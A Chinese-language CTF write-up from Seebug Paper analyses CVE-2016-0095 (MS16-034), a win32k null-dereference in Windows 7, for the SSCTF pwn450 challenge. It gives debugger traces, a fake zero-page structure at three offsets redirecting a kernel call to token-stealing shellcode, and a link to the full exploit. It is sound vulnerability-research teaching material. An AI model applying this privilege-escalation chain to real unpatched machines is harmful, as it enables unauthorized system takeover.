<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>SSCTF pwn450 Windows Kernel Exploitation Writeup</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">SSCTF pwn450 Windows Kernel Exploitation Writeup</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-05-08" class="timeago">4 月，2 周 之前</time>
          <time datetime="2017-05-08" class="fulldate">五月 08, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/experience/">经验心得</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss" value="k0shl" name=""></p>
<p>作者：<a href="http://whereisk0shl.top"><strong>k0shl</strong></a></p>
<h3>前言</h3>
<hr />
<p>刚刚结束的SSCTF里面出了很多贴近实战的题目，有JAVA沙箱逃逸，有office的栈溢出，都比较有意思，这次的pwn450的题目是一道Windows Kernel Exploitation，漏洞编号是CVE-2016-0095（MS16-034），由四叶草的大牛bee13oy提供了一个能触发BSOD的PoC，要求通过分析漏洞并在Win 7环境下完成利用。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/05/1.png-w331s" /></p>
<p>感觉这个过程比较有意思，和师傅们分享一下，这个漏洞相对于之前做过的CVE-2014-4113漏洞来说更为简单，利用上也有点意思，适合做Windows Kernel入门。</p>
<p>本文首先我们简单分析一下PoC，随后我们一起来分析一下这个漏洞的形成原因，最后我们来看一下这个漏洞的利用点在哪里并完成利用，文章最后我将CVE-2016-0095的EoP源码上传到github并提供链接。</p>
<p>另外bee13oy大牛提供的PoC，我在VS2013下编译有一点问题，我稍微调整了一下PoC源码，会一起上传至github。</p>
<p>调试环境按照SSCTF题目要求是Windows 7 x86 sp1. 请师傅们多多指教，谢谢阅读！</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/05/3.png-w331s" /></p>
<hr />
<h3>PoC分析</h3>
<hr />
<p>首先触发MS17-017的核心函数在Trigger_BSoDPoc中。</p>
<pre class="codehilite"><code>    HRGN hRgn = (HRGN)CreateRectRgnIndirect(&amp;rect);

    HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);
    SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);

    HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);

    FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);</code></pre>


<p>这个漏洞和bitmap相关，创建了一个hdc设备句柄，并选入了一个bitmap对象，创建了一个hBrush逻辑刷子，以及一个hRgn矩形对象，最后调用FillRgn触发漏洞。</p>
<p>其中SelectObject选入bitmap对象的hBitmap2，由NtGdiSetBitmapAttributes函数创建，其定义的bitmap结构在demo_CreateBitmapIndirect函数中。</p>
<p>PoC在VS2013编译时存在一些小问题，首先是对NtGdiSetBitmapAttributes的重构定义中使用的W32KAPI，这里编译时报错，增加一个预定义头就可以了。</p>
<pre class="codehilite"><code>#ifndef W32KAPI
#define W32KAPI  DECLSPEC_ADDRSAFE
#endif</code></pre>


<p>第二个问题在重构NtGdiSetBitmapAttributes时内联汇编会使用NtGdiSetBitmapAttributes的系统调用号，随后调用KiFastSystemCall进入内核态，这里KiFastSystemCall没有提供地址，可以直接在函数内LoadLibrary之后使用GetProcAddress获取KiFastSystemCall地址。</p>
<pre class="codehilite"><code>    HMODULE _H_NTDLL = NULL;
    PVOID addr_kifastsystemcall = NULL;
    _H_NTDLL = LoadLibrary(TEXT(&quot;ntdll.dll&quot;));
    addr_kifastsystemcall = (PVOID)GetProcAddress(_H_NTDLL, &quot;KiFastSystemCall&quot;);
    __asm
    {
        push argv1;
        push argv0;
        push 0x00;
        mov eax, eSyscall_NtGdiSetBitmapAttributes;
        mov edx, addr_kifastsystemcall;
        call edx;
        add esp, 0x0c;
    }</code></pre>


<p>这样编译就没问题啦，PoC我们简单分析了一下，下面我们通过Windbg的PIPE进行双机联调，来分析一下这个漏洞的形成原因。</p>
<hr />
<h3>MS16-034漏洞分析</h3>
<hr />
<p>这是一个由于_SURFOBJ-&gt;hDEV未初始化直接引用导致的无效地址访问引发的漏洞，首先运行PoC，Windbg会捕获到异常中断，来看一下中断位置。</p>
<pre class="codehilite"><code>kd&gt; r
eax=00000000 ebx=980b0af8 ecx=00000001 edx=00000000 esi=00000000 edi=fe9950d8
eip=838b0560 esp=980b0928 ebp=980b09a0 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
win32k!bGetRealizedBrush+0x38:
838b0560 f6402401        test    byte ptr [eax+24h],1       ds:0023:00000024=??</code></pre>


<p>中断位置eax的值是0x0，而eax+24是一个无效地址空间，我们需要跟踪这个eax寄存器的值由什么地方得到，首先分析win32k!bGetRealizedBrush函数。</p>
<pre class="codehilite"><code>int __stdcall bGetRealizedBrush(struct BRUSH *a1, struct EBRUSHOBJ *a2, int (__stdcall *a3)(struct _BRUSHOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _XLATEOBJ *, unsigned __int32))
{</code></pre>


<p>函数传入了3个变量，由外层函数分析，可以发现其中a3是EngRealizeBrush函数，是一个写死的值（这点后 面会提到），a1是一个BRUSH结构体，a2是一个EBRUSHOBJ结构体，而漏洞触发位置的eax就由EBRUSHOBJ结构体得来，跟踪分析一下这个过程。</p>
<pre class="codehilite"><code>kd&gt; p
win32k!bGetRealizedBrush+0x1c://ebx由第二个参数得来
969e0544 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]
……
kd&gt; p
win32k!bGetRealizedBrush+0x25://第二个参数+34h的位置的值交给eax
969e054d 8b4334          mov     eax,dword ptr [ebx+34h]
……
kd&gt; p
win32k!bGetRealizedBrush+0x32://eax+1c的值，交给eax，这个值为0
969e055a 8b401c          mov     eax,dword ptr [eax+1Ch]
kd&gt; p
win32k!bGetRealizedBrush+0x35:
969e055d 89450c          mov     dword ptr [ebp+0Ch],eax
kd&gt; p
win32k!bGetRealizedBrush+0x38://eax为0，引发无效内存访问
969e0560 f6402401        test    byte ptr [eax+24h],1</code></pre>


<p>经过上面的分析，我们需要知道，EBRUSHOBJ+34h位置存放着什么样的值，直接来看EBRUSHOBJ结构体的内容。</p>
<pre class="codehilite"><code>kd&gt; dd 8effcaf8
8effcaf8  ffffffff 00000000 00000000 00edfc13
8effcb08  00edfc13 00000000 00000006 00000004
8effcb18  00000000 00ffffff fe96b7c4 00000000
8effcb28  00000000 fd2842e8 ffbff968 ffbffe68</code></pre>


<p>这里0x8effcaf8+34h位置存放的值是fd2842e8，而fd2842e8+1c存放的是0x0，就是这里传递给eax，导致了eax是0x0，从而引发了无效地址访问。</p>
<pre class="codehilite"><code>kd&gt; dd fd2842e8
fd2842e8  108501ef 00000001 80000000 874635f8
fd2842f8  00000000 108501ef 00000000 00000000
fd284308  00000008 00000008 00000020 fd28443c
fd284318  fd28443c 00000004 00001292 00000001</code></pre>


<p>因此我们需要知道fd2842e8＋1c是一个什么对象的值，但通过dt方法没法获得_EBRUSHOBJ的结构，这里对象不明朗没关系，我们可以通过对外层函数的跟踪，来看一下+1c位置存放的是什么样的结构，通过kb堆栈回溯（这里由于多次重启堆栈地址发生变化，不影响调试）</p>
<pre class="codehilite"><code>kd&gt; kb
 # ChildEBP RetAddr  Args to Child              
00 980b09a0 838b34af 00000000 00000000 838ad5a0 win32k!bGetRealizedBrush+0x38
01 980b09b8 83929b5e 980b0af8 00000001 980b0a7c win32k!pvGetEngRbrush+0x1f
02 980b0a1c 839ab6e8 fe975218 00000000 00000000 win32k!EngBitBlt+0x337
03 980b0a54 839abb9d fe975218 980b0a7c 980b0af8 win32k!EngPaint+0x51
04 980b0c20 83e941ea 00000000 ffbff968 1910076b win32k!NtGdiFillRgn+0x339</code></pre>


<p>我们可以看到最外层函数调用了win32k!NtGdiFillRgn函数，直接跟踪外层函数调用，在NtGdiFillRgn函数中。</p>
<pre class="codehilite"><code>            EngPaint(
              (struct _SURFOBJ *)(v5 + 16),
              (int)&amp;v13,
              (struct _BRUSHOBJ *)&amp;v18,
              (struct _POINTL *)(v42 + 1592),
              v10);                             // 函数调用会进这里</code></pre>


<p>接下来我们重启系统，重新跟踪这个过程，对象地址值发生变化，但不影响调试，传入的第一个参数是SURFOBJ对象，来看一下这个对象的内容</p>
<pre class="codehilite"><code>kd&gt; p
win32k!NtGdiFillRgn+0x334:
96adbb98 e8fafaffff      call    win32k!EngPaint (96adb697)
kd&gt; dd esp
903fca5c  ffb58778 903fca7c 903fcaf8 ffaabd60</code></pre>


<p>第一个参数SURFOBJ的值是ffb58778，继续往后跟踪</p>
<pre class="codehilite"><code>kd&gt; p
win32k!EngPaint+0x45:
96adb6dc ff7508          push    dword ptr [ebp+8]
kd&gt; p
win32k!EngPaint+0x48:
96adb6df 8bc8            mov     ecx,eax
kd&gt; p
win32k!EngPaint+0x4a:
96adb6e1 e868e4f8ff      call    win32k!SURFACE::pfnBitBlt (96a69b4e)
kd&gt; dd 903fcaf8//这个值是BRUSH结构体
903fcaf8  ffffffff 00000000 00000000 00edfc13
903fcb08  00edfc13 00000000 00000006 00000004
903fcb18  00000000 00ffffff ffaab7c4 00000000
903fcb28  00000000 ffb58768 ffbff968 ffbffe68//偏移0x34存放的是0xffb58768
903fcb38  ffbbd540 00000006 fe57bc38 00000014
903fcb48  000000d3 00000001 ffffffff 83f77f01
903fcb58  83ec0892 903fcb7c 903fcbb0 00000000
903fcb68  903fcc10 83e17924 00000000 00000000
kd&gt; dd ffb58768//看一下0xffb58768的值
ffb58768  068501b7 00000001 80000000 8754b030
ffb58778  00000000 068501b7 00000000 00000000//这个值是0x0
ffb58788  00000008 00000008 00000020 ffb588bc</code></pre>


<p>我们发现在EBRUSHOBJ+34h位置存放的值，再+10h存放的正是之前的SURFOBJ，可以看到，0xffb58768和之前SURFOBJ对象的值0xffb58778正好相差10h，也就是说，之前ffb58768+1ch位置存放的就是SURFOBJ+0xc的值，可以看到而这个值来看一下SURFOBJ的结构</p>
<pre class="codehilite"><code>typedef struct _SURFOBJ {
  DHSURF dhsurf;
  HSURF  hsurf;
  DHPDEV dhpdev;
  HDEV   hdev;
  SIZEL  sizlBitmap;
  ULONG  cjBits;
  PVOID  pvBits;
  PVOID  pvScan0;
  LONG   lDelta;
  ULONG  iUniq;
  ULONG  iBitmapFormat;
  USHORT iType;
  USHORT fjBitmap;
} SURFOBJ;</code></pre>


<p>前面DHSURF、HSURF、DHPDEV类型长度都是4字节，看到偏移+ch位置存放的是hdev对象，正是在PoC中未对hdev对象进行初始化直接引用，导致了漏洞的发生。我们也可以来看一下_EBRUSHOBJ的一些结构概况。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/05/4.png-w331s" /></p>
<p>红框框应该是BRUSHOBJ，其中前4个字节时iSolidColor，中间4个字节是pvRbrush，后4个字节是flColorType，绿框框应该是在PoC中定义的hBrush的COLORREF，粉框框则是SURFOBJ-10h的一个结构，问题也出现在这里。</p>
<hr />
<h3>PWN!!</h3>
<hr />
<p>知道了这个漏洞形成原因，我们来考虑利用过程，首先，我们回到触发漏洞的位置，这里引用了eax＋24，就是0x0＋24，在Win7下限制较少，不像Win8和Win10，在_EPROCESS结构中有VdmAllowed之类的来限制NtAllocateVirtualMemory申请零页内存，如果我们通过NtAllocateVirtualMemory申请零页内存，那么对应位置就不是一个无效地址了。</p>
<p>我们通过伪代码来看一下这一小部分的逻辑。</p>
<pre class="codehilite"><code>  P = 0;
  v69 = 0;
  a2 = *(struct EBRUSHOBJ **)(v6 + 28);//key！！a2被赋值为0了！
  v45 = (*((_BYTE *)a2 + 36) &amp; 1) == 0;//引发BSOD位置
  v72 = 0;
  v75 = 0;</code></pre>


<p>可以看到，在之前a2会由于hdev未初始化，而直接引用，被赋值为0x0，那么也就是说，在函数后面所有跟a2有关的操作部分，比如a2+0xn的操作，都是在零页内存位置做操作，比如后面的a2+36就是引发bsod的位置，将0x0+24h了。</p>
<p>那么也就是说，如果我们用NtAllocateVirtualMemory分配了零页内存，那么零页内存位置的值我们都是可控的，也就是说在win32k!bGetRealizedBrush中，所有跟a2相关的位置我们都是可控的。</p>
<p>换个角度讲，我们可以在零页位置构造一个fake struct来控制一些可控的位置。接下来，为了利用，我们需要在win32k!bGetRealizedBrush中，找到一些可以利用的点。</p>
<p>找到了两个点，第一个点比较好找，第二个点我不够细心没找到，还是pxx提醒了我，感谢pxx师傅！</p>
<p>第一个点在</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/05/6.png-w331s" /></p>
<p>第二个点在</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/05/5.png-w331s" /></p>
<p>其中第一个点不好用，就是之前我说到的这是一个常数，这里引用的是EngRealizeBrush函数，是在传递参数时一个定值，这个值不能被修改。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/05/7.png-w331s" /></p>
<p>因此我们能利用的位置应该就是第二个点，但其实，从我们漏洞触发位置，到漏洞利用位置有几处if语句判断，第一处。</p>
<pre class="codehilite"><code>.text:BF840799 ; 119:       v23 = *((_WORD *)v20 + 712);
.text:BF840799
.text:BF840799 loc_BF840799:                           ; CODE XREF: bGetRealizedBrush(BRUSH *,EBRUSHOBJ *,int (*)(_BRUSHOBJ *,_SURFOBJ *,_SURFOBJ *,_SURFOBJ *,_XLATEOBJ *,ulong))+266j
.text:BF840799                 movzx   edx, word ptr [eax+590h] ; check 0x590
.text:BF8407A0 ; 120:       if ( !v23 )
.text:BF8407A0                 cmp     dx, si
.text:BF8407A3 ; 121:         goto LABEL_23;
.text:BF8407A3                 jz      loc_BF8406F7</code></pre>


<p>这时候v20的值是a2，而a2的值来自于  a2 = <em>(struct EBRUSHOBJ </em>*)(v6 + 28);，之前已经分析过，由于未初始化，这个值为0，那么第一处在v23的if语句跳转中，需要置0+0x590位置的值为不为0的数。</p>
<p>接下来第二处跳转。</p>
<pre class="codehilite"><code>.text:BF8407A3 ; 120:       if ( !v23 )
.text:BF8407A3                 jz      loc_BF8406F7
.text:BF8407A9 ; 122:       v24 = (struct EBRUSHOBJ *)((char *)v20 + 1426);
.text:BF8407A9                 add     eax, 592h  ; Check 0x592
.text:BF8407AE ; 123:       if ( !*(_WORD *)v24 )
.text:BF8407AE                 cmp     [eax], si
.text:BF8407B1 ; 124:         goto LABEL_23;
.text:BF8407B1                 jz      loc_BF8406F7</code></pre>


<p>这个地方又要一个if语句跳转，这个地方需要置0x592位置的值为不为0的数。</p>
<p>最后一处，也就是call edi之前的位置</p>
<pre class="codehilite"><code>.text:BF8407F0                 mov     edi, [eax+748h]//edi赋值为跳板值
.text:BF8407F6                 setz    cl
.text:BF8407F9                 inc     ecx
.text:BF8407FA                 mov     [ebp+var_14], ecx
.text:BF8407FD ; 134:       if ( v26 )
.text:BF8407FD                 cmp     edi, esi//这里仍旧是和0比较
.text:BF8407FF                 jz      short loc_BF840823</code></pre>


<p>这里检查的是0x748的位置，这个地方需要edi和esi做比较，edi不为0，这里赋值为替换token的shellcode的值就是不为0的值了，直接可以跳转。</p>
<p>只要绕过了这3处，就可以到达call edi了，而call edi，又来自eax＋748，这个位置我们可控，这样就能到shellcode位置了，所以，我们需要在零页分配一个0x1000的内存（只要大于748，随便定义）。</p>
<p>随后布置这3个值，之后我们可以达到零页可控位置。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/05/8.png-w331s" /></p>
<p>接下来，我们只需要在源码中使用steal token shellcode，然后在内核态执行用户态shellcode，完成token替换，这样我们通过如下代码部署零页内存。</p>
<pre class="codehilite"><code>    void* bypass_one = (void *)0x590;
    *(LPBYTE)bypass_one = 0x1;
    void* bypass_two = (void *)0x592;
    *(LPBYTE)bypass_two = 0x1;
    void* jump_addr = (void *)0x748;
    *(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;</code></pre>


<p>由于Win7下没有SMEP，因此我们也不需要使用ROP来修改CR4寄存器的值，这样，我们在RING0下执行RING3 shellcode完成提权。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/05/2.jpg-w331s" /></p>
<p>最后，我提供一个我的Exploit的下载地址：
https://github.com/k0keoyo/SSCTF-pwn450-ms16-034-writeup</p>
<p>请师傅们多多指教，谢谢！Have fun and PWN!</p>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/298/">https://paper.seebug.org/298/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/297/"><span aria-hidden="true">&larr;</span> PHP-CGI远程代码执行漏洞（CVE-2012-18...</a>
    
    
      <a class="older-posts" href="/299/">NSA泄密事件之SMB系列远程命令执行漏洞及Doubl... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=k0shl"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/005PzhAMjw8f81c3d8m10j30jg0hawhb.jpg)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=k0shl">k0shl</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=k0shl">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
